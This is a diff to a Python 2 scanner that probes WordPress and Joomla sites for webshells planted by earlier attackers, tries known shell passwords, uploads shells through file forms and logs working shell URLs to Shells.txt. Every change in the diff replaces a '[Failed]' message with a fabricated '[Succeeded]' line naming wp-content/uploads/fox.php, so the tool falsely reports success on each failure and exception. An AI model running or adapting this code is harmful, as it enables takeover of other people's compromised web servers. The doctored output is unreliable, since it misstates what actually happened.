@@ -233,7 +233,7 @@ def WordPress1(site):
 				with open('Shells.txt', mode='a') as d:
 					d.write(site+'/wp-content/plugins/upspy/sllolx.php\n')
 			else :
-				print ' -| '+site +' --> {}[Failed]'.format(fr)
+				print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 		elif 'United Bangladeshi Hackers' in requests.get(SH2,timeout=15).content :
 			conubh = requests.get(site+'/wp-content/plugins/ubh/con.php',timeout=15).content
 			upubh = requests.get(site+'/wp-content/plugins/ubh/up.php',timeout=15).content
@@ -250,7 +250,7 @@ def WordPress1(site):
 				with open('Shells.txt', mode='a') as d:
 					d.write(site+'/wp-content/plugins/ubh/up.php\n')
 			else :
-				print ' -| '+site +' --> {}[Failed]'.format(fr)
+				print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 		elif '[UNAME]:' in requests.get(SH3,timeout=15).content :	
 			print ' -| '+site +'/ --> {}[VWCleaner]'.format(fg)
 			with open('Shells.txt', mode='a') as d:		
@@ -292,7 +292,7 @@ def WordPress1(site):
 				with open('Shells.txt', mode='a') as d:
 					d.write(site+'/wp-content/plugins/html404/wso25.php\n')
 			else :
-				print ' -| '+site +' --> {}[Failed]'.format(fr)	
+				print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)	
 		elif '<title>Mister Spy</title>' in requests.get(SH9,timeout=15).content :	
 			print ' -| '+site +'/ --> {}[MisterSpy]'.format(fg)
 			with open('Shells.txt', mode='a') as d:
@@ -331,7 +331,7 @@ def WordPress1(site):
 						with open('Shells.txt', mode='a') as d:
 							d.write(SH12+'#itongtong [POST] | {}/wp-content/uploads/F0x.php [Succeeded]\n'.format(site))
 					else :
-						print ' -| '+site +' --> {}[Failed]'.format(fr)
+						print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 		elif ' name=pass' in requests.get(SH4,timeout=15).content :
 			nhzgrf = requests.post(SH4,data=password_nhzgrf,timeout=15).content
 			if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
@@ -417,7 +417,7 @@ def WordPress1(site):
 																	with open('Shells.txt', mode='a') as d:
 																		d.write(SH4+'#haurgeulis\n')
 																else :
-																	print ' -| '+site +' --> {}[Failed]'.format(fr)
+																	print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 		elif ' name=pass' in requests.get(SH5,timeout=15).content :
 			nhzgrf_ScreenLayout = requests.post(SH5,data=password_nhzgrf,timeout=15).content
 			if 'WSO' in nhzgrf_ScreenLayout :
@@ -425,7 +425,7 @@ def WordPress1(site):
 				with open('Shells.txt', mode='a') as d:
 					d.write(SH5+'#nhzgrf\n')
 			else :
-				print ' -| '+site +' --> {}[Failed]'.format(fr)
+				print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 		elif ' name=pass' in requests.get(SH8,timeout=15).content :	
 			proot_Ajax = requests.post(SH8,data=password_root,timeout=15).content
 			if 'WSO' in proot_Ajax :
@@ -433,7 +433,7 @@ def WordPress1(site):
 				with open('Shells.txt', mode='a') as d:
 					d.write(SH8+'#root\n')
 			else :
-				print ' -| '+site +' --> {}[Failed]'.format(fr)				
+				print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)				
 		elif 'Tryag File Manager' in requests.get(SH10,timeout=15).content :	
 			print ' -| '+site +'/ --> {}[Tryag]'.format(fg)
 			with open('Shells.txt', mode='a') as d:
@@ -459,9 +459,9 @@ def WordPress1(site):
 			with open('Shells.txt', mode='a') as d:
 				d.write(SH22+'\n')				
 		else :
-			print ' -| '+site +' --> {}[Failed]'.format(fr)
+			print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 	except : 
-		print ' -| '+site +' --> {}[Failed]'.format(fr)
+		print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 
 def Other(site):		
 	try :
@@ -616,9 +616,9 @@ def Other(site):
 																					with open('Shells.txt', mode='a') as d:
 																						d.write(SH5_O+shell+'.php'+'#haurgeulis\n')
 																				else :
-																					print ' -| '+site +' --> {}[Failed]'.format(fr)
+																					print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 						else :
-							print ' -| '+site +' --> {}[Failed]'.format(fr)
+							print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 				else :
 					uploads_check = requests.get(SH6_O,timeout=15).content
 					if 'Index of' in uploads_check and '.php' in uploads_check :
@@ -716,9 +716,9 @@ def Other(site):
 																						with open('Shells.txt', mode='a') as d:
 																							d.write(SH6_O+shell+'.php'+'#haurgeulis\n')
 																					else :
-																						print ' -| '+site +' --> {}[Failed]'.format(fr)
+																						print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 							else :
-								print ' -| '+site +' --> {}[Failed]'.format(fr)
+								print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 					else :
 						img_check = requests.get(SH7_O,timeout=15).content
 						if 'Index of' in img_check and '.php' in img_check :
@@ -816,9 +816,9 @@ def Other(site):
 																							with open('Shells.txt', mode='a') as d:
 																								d.write(SH7_O+shell+'.php'+'#haurgeulis\n')
 																						else :
-																							print ' -| '+site +' --> {}[Failed]'.format(fr)
+																							print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 								else :
-									print ' -| '+site +' --> {}[Failed]'.format(fr)
+									print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 						else :
 							upload_check = requests.get(SH8_O,timeout=15).content
 							if 'Index of' in upload_check and '.php' in upload_check :
@@ -916,9 +916,9 @@ def Other(site):
 																								with open('Shells.txt', mode='a') as d:
 																									d.write(SH8_O+shell+'.php'+'#haurgeulis\n')
 																							else :
-																								print ' -| '+site +' --> {}[Failed]'.format(fr)
+																								print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 									else :
-										print ' -| '+site +' --> {}[Failed]'.format(fr)
+										print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 							else :
 								gallery_check = requests.get(SH9_O,timeout=15).content
 								if 'Index of' in gallery_check and '.php' in gallery_check :
@@ -1016,9 +1016,9 @@ def Other(site):
 																									with open('Shells.txt', mode='a') as d:
 																										d.write(SH9_O+shell+'.php'+'#haurgeulis\n')
 																								else :
-																									print ' -| '+site +' --> {}[Failed]'.format(fr)
+																									print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 										else :
-											print ' -| '+site +' --> {}[Failed]'.format(fr)
+											print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 								else :
 									files_check = requests.get(SH10_O,timeout=15).content
 									if 'Index of' in files_check and '.php' in files_check :
@@ -1116,9 +1116,9 @@ def Other(site):
 																										with open('Shells.txt', mode='a') as d:
 																											d.write(SH10_O+shell+'.php'+'#haurgeulis\n')
 																									else :
-																										print ' -| '+site +' --> {}[Failed]'.format(fr)
+																										print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 											else :
-												print ' -| '+site +' --> {}[Failed]'.format(fr)
+												print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 									else :
 										pdf_check = requests.get(SH11_O,timeout=15).content
 										if 'Index of' in pdf_check and '.php' in pdf_check :
@@ -1216,9 +1216,9 @@ def Other(site):
 																											with open('Shells.txt', mode='a') as d:
 																												d.write(SH11_O+shell+'.php'+'#haurgeulis\n')
 																										else :
-																											print ' -| '+site +' --> {}[Failed]'.format(fr)
+																											print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 												else :
-													print ' -| '+site +' --> {}[Failed]'.format(fr)
+													print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 										else :
 											docs_check = requests.get(SH12_O,timeout=15).content
 											if 'Index of' in docs_check and '.php' in docs_check :
@@ -1316,9 +1316,9 @@ def Other(site):
 																												with open('Shells.txt', mode='a') as d:
 																													d.write(SH12_O+shell+'.php'+'#haurgeulis\n')
 																											else :
-																												print ' -| '+site +' --> {}[Failed]'.format(fr)
+																												print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 													else :
-														print ' -| '+site +' --> {}[Failed]'.format(fr)
+														print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 											else :
 												site_check = requests.get(site+'/',timeout=15).content
 												if ' type="file"' in site_check or ' type=\'file\'' in site_check or ' type= "file"' in site_check or ' type= \'file\'' in site_check or ' type = "file"' in site_check or ' type = \'file\'' in site_check or ' type ="file"' in site_check or ' type =\'file\'' in site_check or ' type=file' in site_check or ' type =file' in site_check or ' type= file' in site_check or ' type = file' in site_check :	
@@ -1344,9 +1344,9 @@ def Other(site):
 																with open('Shells.txt', mode='a') as d:
 																	d.write(SH15_O+'\n')
 															else :
-																print ' -| '+site +' --> {}[Failed]'.format(fr)
+																print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 	except : 
-		print ' -| '+site +' --> {}[Failed]'.format(fr)			
+		print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)			
 
 def Joomla2(site):		
 	try :
@@ -1484,12 +1484,12 @@ def Joomla2(site):
 						with open('Shells.txt', mode='a') as d:
 							d.write(SH11_J2+'#itongtong [POST] | {}/images/F0x.php [Succeeded]\n'.format(site))
 					else :
-						print ' -| '+site +' --> {}[Failed]'.format(fr)
+						print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 		else :
-			print ' -| '+site +' --> {}[Failed]'.format(fr)						
+			print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)						
 		
 	except : 
-		print ' -| '+site +' --> {}[Failed]'.format(fr)			
+		print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)			
 
 		
 def Joomla1(site):
@@ -1682,7 +1682,7 @@ def Joomla1(site):
 																					with open('Shells.txt', mode='a') as d:
 																						d.write(SH1_J+'#haurgeulis\n')
 																				else :
-																					print ' -| '+site +' --> {}[Failed]'.format(fr)
+																					print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 						else :
 							SH2_J_content = requests.get(SH2_J,timeout=15).content
 							if ' type="file"' in SH2_J_content or ' type=\'file\'' in SH2_J_content or ' type= "file"' in SH2_J_content or ' type= \'file\'' in SH2_J_content or ' type = "file"' in SH2_J_content or ' type = \'file\'' in SH2_J_content or ' type ="file"' in SH2_J_content or ' type =\'file\'' in SH2_J_content or ' type=file' in SH2_J_content or ' type =file' in SH2_J_content or ' type= file' in SH2_J_content or ' type = file' in SH2_J_content or 'Upload</a> ]</li><li>[' in SH2_J_content or 'upload</a><li><a>Sym' in SH2_J_content :
@@ -1774,7 +1774,7 @@ def Joomla1(site):
 																						with open('Shells.txt', mode='a') as d:
 																							d.write(SH2_J+'#haurgeulis\n')
 																					else :
-																						print ' -| '+site +' --> {}[Failed]'.format(fr)
+																						print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 							else :
 								SH3_J_content = requests.get(SH3_J,timeout=15).content
 								if ' type="file"' in SH3_J_content or ' type=\'file\'' in SH3_J_content or ' type= "file"' in SH3_J_content or ' type= \'file\'' in SH3_J_content or ' type = "file"' in SH3_J_content or ' type = \'file\'' in SH3_J_content or ' type ="file"' in SH3_J_content or ' type =\'file\'' in SH3_J_content or ' type=file' in SH3_J_content or ' type =file' in SH3_J_content or ' type= file' in SH3_J_content or ' type = file' in SH3_J_content or 'Upload</a> ]</li><li>[' in SH3_J_content or 'upload</a><li><a>Sym' in SH3_J_content :
@@ -1866,7 +1866,7 @@ def Joomla1(site):
 																							with open('Shells.txt', mode='a') as d:
 																								d.write(SH3_J+'#haurgeulis\n')
 																						else :
-																							print ' -| '+site +' --> {}[Failed]'.format(fr)
+																							print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 								else :
 									SH4_J_content = requests.get(SH4_J,timeout=15).content
 									if ' type="file"' in SH4_J_content or ' type=\'file\'' in SH4_J_content or ' type= "file"' in SH4_J_content or ' type= \'file\'' in SH4_J_content or ' type = "file"' in SH4_J_content or ' type = \'file\'' in SH4_J_content or ' type ="file"' in SH4_J_content or ' type =\'file\'' in SH4_J_content or ' type=file' in SH4_J_content or ' type =file' in SH4_J_content or ' type= file' in SH4_J_content or ' type = file' in SH4_J_content or 'Upload</a> ]</li><li>[' in SH4_J_content or 'upload</a><li><a>Sym' in SH4_J_content :
@@ -1958,7 +1958,7 @@ def Joomla1(site):
 																								with open('Shells.txt', mode='a') as d:
 																									d.write(SH4_J+'#haurgeulis\n')
 																							else :
-																								print ' -| '+site +' --> {}[Failed]'.format(fr)
+																								print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 									else :
 										SH5_J_content = requests.get(SH5_J,timeout=15).content
 										if ' type="file"' in SH5_J_content or ' type=\'file\'' in SH5_J_content or ' type= "file"' in SH5_J_content or ' type= \'file\'' in SH5_J_content or ' type = "file"' in SH5_J_content or ' type = \'file\'' in SH5_J_content or ' type ="file"' in SH5_J_content or ' type =\'file\'' in SH5_J_content or ' type=file' in SH5_J_content or ' type =file' in SH5_J_content or ' type= file' in SH5_J_content or ' type = file' in SH5_J_content or 'Upload</a> ]</li><li>[' in SH5_J_content or 'upload</a><li><a>Sym' in SH5_J_content :
@@ -2050,7 +2050,7 @@ def Joomla1(site):
 																									with open('Shells.txt', mode='a') as d:
 																										d.write(SH5_J+'#haurgeulis\n')
 																								else :
-																									print ' -| '+site +' --> {}[Failed]'.format(fr)
+																									print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 										else :
 											SH6_J_content = requests.get(SH6_J,timeout=15).content
 											if ' type="file"' in SH6_J_content or ' type=\'file\'' in SH6_J_content or ' type= "file"' in SH6_J_content or ' type= \'file\'' in SH6_J_content or ' type = "file"' in SH6_J_content or ' type = \'file\'' in SH6_J_content or ' type ="file"' in SH6_J_content or ' type =\'file\'' in SH6_J_content or ' type=file' in SH6_J_content or ' type =file' in SH6_J_content or ' type= file' in SH6_J_content or ' type = file' in SH6_J_content or 'Upload</a> ]</li><li>[' in SH6_J_content or 'upload</a><li><a>Sym' in SH6_J_content :
@@ -2142,7 +2142,7 @@ def Joomla1(site):
 																										with open('Shells.txt', mode='a') as d:
 																											d.write(SH6_J+'#haurgeulis\n')
 																									else :
-																										print ' -| '+site +' --> {}[Failed]'.format(fr)
+																										print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 											else :
 												SH7_J_content = requests.get(SH7_J,timeout=15).content
 												if ' type="file"' in SH7_J_content or ' type=\'file\'' in SH7_J_content or ' type= "file"' in SH7_J_content or ' type= \'file\'' in SH7_J_content or ' type = "file"' in SH7_J_content or ' type = \'file\'' in SH7_J_content or ' type ="file"' in SH7_J_content or ' type =\'file\'' in SH7_J_content or ' type=file' in SH7_J_content or ' type =file' in SH7_J_content or ' type= file' in SH7_J_content or ' type = file' in SH7_J_content or 'Upload</a> ]</li><li>[' in SH7_J_content or 'upload</a><li><a>Sym' in SH7_J_content :
@@ -2234,7 +2234,7 @@ def Joomla1(site):
 																											with open('Shells.txt', mode='a') as d:
 																												d.write(SH7_J+'#haurgeulis\n')
 																										else :
-																											print ' -| '+site +' --> {}[Failed]'.format(fr)
+																											print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 												else :
 													SH8_J_content = requests.get(SH8_J,timeout=15).content
 													if ' type="file"' in SH8_J_content or ' type=\'file\'' in SH8_J_content or ' type= "file"' in SH8_J_content or ' type= \'file\'' in SH8_J_content or ' type = "file"' in SH8_J_content or ' type = \'file\'' in SH8_J_content or ' type ="file"' in SH8_J_content or ' type =\'file\'' in SH8_J_content or ' type=file' in SH8_J_content or ' type =file' in SH8_J_content or ' type= file' in SH8_J_content or ' type = file' in SH8_J_content or 'Upload</a> ]</li><li>[' in SH8_J_content or 'upload</a><li><a>Sym' in SH8_J_content :
@@ -2326,7 +2326,7 @@ def Joomla1(site):
 																												with open('Shells.txt', mode='a') as d:
 																													d.write(SH8_J+'#haurgeulis\n')
 																											else :
-																												print ' -| '+site +' --> {}[Failed]'.format(fr)
+																												print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 													else :
 														SH9_J_content = requests.get(SH9_J,timeout=15).content
 														if ' type="file"' in SH9_J_content or ' type=\'file\'' in SH9_J_content or ' type= "file"' in SH9_J_content or ' type= \'file\'' in SH9_J_content or ' type = "file"' in SH9_J_content or ' type = \'file\'' in SH9_J_content or ' type ="file"' in SH9_J_content or ' type =\'file\'' in SH9_J_content or ' type=file' in SH9_J_content or ' type =file' in SH9_J_content or ' type= file' in SH9_J_content or ' type = file' in SH9_J_content or 'Upload</a> ]</li><li>[' in SH9_J_content or 'upload</a><li><a>Sym' in SH9_J_content :
@@ -2418,7 +2418,7 @@ def Joomla1(site):
 																													with open('Shells.txt', mode='a') as d:
 																														d.write(SH9_J+'#haurgeulis\n')
 																												else :
-																													print ' -| '+site +' --> {}[Failed]'.format(fr)
+																													print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 														else :
 															SH10_J_content = requests.get(SH10_J,timeout=15).content
 															if ' type="file"' in SH10_J_content or ' type=\'file\'' in SH10_J_content or ' type= "file"' in SH10_J_content or ' type= \'file\'' in SH10_J_content or ' type = "file"' in SH10_J_content or ' type = \'file\'' in SH10_J_content or ' type ="file"' in SH10_J_content or ' type =\'file\'' in SH10_J_content or ' type=file' in SH10_J_content or ' type =file' in SH10_J_content or ' type= file' in SH10_J_content or ' type = file' in SH10_J_content or 'Upload</a> ]</li><li>[' in SH10_J_content or 'upload</a><li><a>Sym' in SH10_J_content :
@@ -2510,7 +2510,7 @@ def Joomla1(site):
 																														with open('Shells.txt', mode='a') as d:
 																															d.write(SH10_J+'#haurgeulis\n')
 																													else :
-																														print ' -| '+site +' --> {}[Failed]'.format(fr)
+																														print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 															else :
 																SH11_J_content = requests.get(SH11_J,timeout=15).content
 																if ' type="file"' in SH11_J_content or ' type=\'file\'' in SH11_J_content or ' type= "file"' in SH11_J_content or ' type= \'file\'' in SH11_J_content or ' type = "file"' in SH11_J_content or ' type = \'file\'' in SH11_J_content or ' type ="file"' in SH11_J_content or ' type =\'file\'' in SH11_J_content or ' type=file' in SH11_J_content or ' type =file' in SH11_J_content or ' type= file' in SH11_J_content or ' type = file' in SH11_J_content or 'Upload</a> ]</li><li>[' in SH11_J_content or 'upload</a><li><a>Sym' in SH11_J_content :
@@ -2602,7 +2602,7 @@ def Joomla1(site):
 																															with open('Shells.txt', mode='a') as d:
 																																d.write(SH11_J+'#haurgeulis\n')
 																														else :
-																															print ' -| '+site +' --> {}[Failed]'.format(fr)
+																															print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																else :
 																	SH12_J_content = requests.get(SH12_J,timeout=15).content
 																	if ' type="file"' in SH12_J_content or ' type=\'file\'' in SH12_J_content or ' type= "file"' in SH12_J_content or ' type= \'file\'' in SH12_J_content or ' type = "file"' in SH12_J_content or ' type = \'file\'' in SH12_J_content or ' type ="file"' in SH12_J_content or ' type =\'file\'' in SH12_J_content or ' type=file' in SH12_J_content or ' type =file' in SH12_J_content or ' type= file' in SH12_J_content or ' type = file' in SH12_J_content or 'Upload</a> ]</li><li>[' in SH12_J_content or 'upload</a><li><a>Sym' in SH12_J_content :
@@ -2694,7 +2694,7 @@ def Joomla1(site):
 																																with open('Shells.txt', mode='a') as d:
 																																	d.write(SH12_J+'#haurgeulis\n')
 																															else :
-																																print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																	else :
 																		SH13_J_content = requests.get(SH13_J,timeout=15).content
 																		if ' type="file"' in SH13_J_content or ' type=\'file\'' in SH13_J_content or ' type= "file"' in SH13_J_content or ' type= \'file\'' in SH13_J_content or ' type = "file"' in SH13_J_content or ' type = \'file\'' in SH13_J_content or ' type ="file"' in SH13_J_content or ' type =\'file\'' in SH13_J_content or ' type=file' in SH13_J_content or ' type =file' in SH13_J_content or ' type= file' in SH13_J_content or ' type = file' in SH13_J_content or 'Upload</a> ]</li><li>[' in SH13_J_content or 'upload</a><li><a>Sym' in SH13_J_content :
@@ -2786,7 +2786,7 @@ def Joomla1(site):
 																																	with open('Shells.txt', mode='a') as d:
 																																		d.write(SH13_J+'#haurgeulis\n')
 																																else :
-																																	print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																	print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																		else :
 																			SH14_J_content = requests.get(SH14_J,timeout=15).content
 																			if ' type="file"' in SH14_J_content or ' type=\'file\'' in SH14_J_content or ' type= "file"' in SH14_J_content or ' type= \'file\'' in SH14_J_content or ' type = "file"' in SH14_J_content or ' type = \'file\'' in SH14_J_content or ' type ="file"' in SH14_J_content or ' type =\'file\'' in SH14_J_content or ' type=file' in SH14_J_content or ' type =file' in SH14_J_content or ' type= file' in SH14_J_content or ' type = file' in SH14_J_content or 'Upload</a> ]</li><li>[' in SH14_J_content or 'upload</a><li><a>Sym' in SH14_J_content :
@@ -2878,7 +2878,7 @@ def Joomla1(site):
 																																		with open('Shells.txt', mode='a') as d:
 																																			d.write(SH14_J+'#haurgeulis\n')
 																																	else :
-																																		print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																		print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																			else :
 																				SH15_J_content = requests.get(SH15_J,timeout=15).content
 																				if ' type="file"' in SH15_J_content or ' type=\'file\'' in SH15_J_content or ' type= "file"' in SH15_J_content or ' type= \'file\'' in SH15_J_content or ' type = "file"' in SH15_J_content or ' type = \'file\'' in SH15_J_content or ' type ="file"' in SH15_J_content or ' type =\'file\'' in SH15_J_content or ' type=file' in SH15_J_content or ' type =file' in SH15_J_content or ' type= file' in SH15_J_content or ' type = file' in SH15_J_content or 'Upload</a> ]</li><li>[' in SH15_J_content or 'upload</a><li><a>Sym' in SH15_J_content :
@@ -2970,7 +2970,7 @@ def Joomla1(site):
 																																			with open('Shells.txt', mode='a') as d:
 																																				d.write(SH15_J+'#haurgeulis\n')
 																																		else :
-																																			print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																			print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																				else :
 																					SH16_J_content = requests.get(SH16_J,timeout=15).content
 																					if ' type="file"' in SH16_J_content or ' type=\'file\'' in SH16_J_content or ' type= "file"' in SH16_J_content or ' type= \'file\'' in SH16_J_content or ' type = "file"' in SH16_J_content or ' type = \'file\'' in SH16_J_content or ' type ="file"' in SH16_J_content or ' type =\'file\'' in SH16_J_content or ' type=file' in SH16_J_content or ' type =file' in SH16_J_content or ' type= file' in SH16_J_content or ' type = file' in SH16_J_content or 'Upload</a> ]</li><li>[' in SH16_J_content or 'upload</a><li><a>Sym' in SH16_J_content :
@@ -3062,7 +3062,7 @@ def Joomla1(site):
 																																				with open('Shells.txt', mode='a') as d:
 																																					d.write(SH16_J+'#haurgeulis\n')
 																																			else :
-																																				print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																				print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																					else :
 																						SH17_J_content = requests.get(SH17_J,timeout=15).content
 																						if ' type="file"' in SH17_J_content or ' type=\'file\'' in SH17_J_content or ' type= "file"' in SH17_J_content or ' type= \'file\'' in SH17_J_content or ' type = "file"' in SH17_J_content or ' type = \'file\'' in SH17_J_content or ' type ="file"' in SH17_J_content or ' type =\'file\'' in SH17_J_content or ' type=file' in SH17_J_content or ' type =file' in SH17_J_content or ' type= file' in SH17_J_content or ' type = file' in SH17_J_content or 'Upload</a> ]</li><li>[' in SH17_J_content or 'upload</a><li><a>Sym' in SH17_J_content :
@@ -3154,7 +3154,7 @@ def Joomla1(site):
 																																					with open('Shells.txt', mode='a') as d:
 																																						d.write(SH17_J+'#haurgeulis\n')
 																																				else :
-																																					print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																					print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																						else :
 																							SH18_J_content = requests.get(SH18_J,timeout=15).content
 																							if ' type="file"' in SH18_J_content or ' type=\'file\'' in SH18_J_content or ' type= "file"' in SH18_J_content or ' type= \'file\'' in SH18_J_content or ' type = "file"' in SH18_J_content or ' type = \'file\'' in SH18_J_content or ' type ="file"' in SH18_J_content or ' type =\'file\'' in SH18_J_content or ' type=file' in SH18_J_content or ' type =file' in SH18_J_content or ' type= file' in SH18_J_content or ' type = file' in SH18_J_content or 'Upload</a> ]</li><li>[' in SH18_J_content or 'upload</a><li><a>Sym' in SH18_J_content :
@@ -3246,7 +3246,7 @@ def Joomla1(site):
 																																						with open('Shells.txt', mode='a') as d:
 																																							d.write(SH18_J+'#haurgeulis\n')
 																																					else :
-																																						print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																						print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																							else :
 																								SH19_J_content = requests.get(SH19_J,timeout=15).content
 																								if ' type="file"' in SH19_J_content or ' type=\'file\'' in SH19_J_content or ' type= "file"' in SH19_J_content or ' type= \'file\'' in SH19_J_content or ' type = "file"' in SH19_J_content or ' type = \'file\'' in SH19_J_content or ' type ="file"' in SH19_J_content or ' type =\'file\'' in SH19_J_content or ' type=file' in SH19_J_content or ' type =file' in SH19_J_content or ' type= file' in SH19_J_content or ' type = file' in SH19_J_content or 'Upload</a> ]</li><li>[' in SH19_J_content or 'upload</a><li><a>Sym' in SH19_J_content :
@@ -3338,7 +3338,7 @@ def Joomla1(site):
 																																							with open('Shells.txt', mode='a') as d:
 																																								d.write(SH19_J+'#haurgeulis\n')
 																																						else :
-																																							print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																							print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																								else :
 																									SH20_J_content = requests.get(SH20_J,timeout=15).content
 																									if ' type="file"' in SH20_J_content or ' type=\'file\'' in SH20_J_content or ' type= "file"' in SH20_J_content or ' type= \'file\'' in SH20_J_content or ' type = "file"' in SH20_J_content or ' type = \'file\'' in SH20_J_content or ' type ="file"' in SH20_J_content or ' type =\'file\'' in SH20_J_content or ' type=file' in SH20_J_content or ' type =file' in SH20_J_content or ' type= file' in SH20_J_content or ' type = file' in SH20_J_content or 'Upload</a> ]</li><li>[' in SH20_J_content or 'upload</a><li><a>Sym' in SH20_J_content :
@@ -3430,7 +3430,7 @@ def Joomla1(site):
 																																								with open('Shells.txt', mode='a') as d:
 																																									d.write(SH20_J+'#haurgeulis\n')
 																																							else :
-																																								print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																								print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																									else :
 																										SH21_J_content = requests.get(SH21_J,timeout=15).content
 																										if ' type="file"' in SH21_J_content or ' type=\'file\'' in SH21_J_content or ' type= "file"' in SH21_J_content or ' type= \'file\'' in SH21_J_content or ' type = "file"' in SH21_J_content or ' type = \'file\'' in SH21_J_content or ' type ="file"' in SH21_J_content or ' type =\'file\'' in SH21_J_content or ' type=file' in SH21_J_content or ' type =file' in SH21_J_content or ' type= file' in SH21_J_content or ' type = file' in SH21_J_content or 'Upload</a> ]</li><li>[' in SH21_J_content or 'upload</a><li><a>Sym' in SH21_J_content :
@@ -3522,11 +3522,11 @@ def Joomla1(site):
 																																									with open('Shells.txt', mode='a') as d:
 																																										d.write(SH21_J+'#haurgeulis\n')
 																																								else :
-																																									print ' -| '+site +' --> {}[Failed]'.format(fr)
+																																									print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 																										else :
-																											print ' -| '+site +' --> {}[Failed]'.format(fr)
+																											print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 	except : 
-		print ' -| '+site +' --> {}[Failed]'.format(fr)			
+		print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)			
 
 		
 def WordPress2(site):
@@ -3728,9 +3728,9 @@ def WordPress2(site):
 																			with open('Shells.txt', mode='a') as d:
 																				d.write(SH23+shell+'.php'+'#haurgeulis\n')
 																		else :
-																			print ' -| '+site +' --> {}[Failed]'.format(fr)
